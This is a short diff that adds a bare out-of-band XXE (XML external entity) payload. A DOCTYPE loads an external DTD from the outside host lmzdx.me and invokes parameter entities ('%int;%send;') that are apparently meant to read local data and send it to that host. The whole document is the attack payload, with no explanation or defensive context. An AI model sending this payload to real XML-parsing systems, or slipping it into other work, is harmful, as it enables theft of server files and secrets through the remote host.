@@ -1,0 +1,4 @@
+<!DOCTYPE convert [ 
+<!ENTITY % remote SYSTEM "http://lmzdx.me/dtd.dtd">
+%remote;%int;%send;
+]>
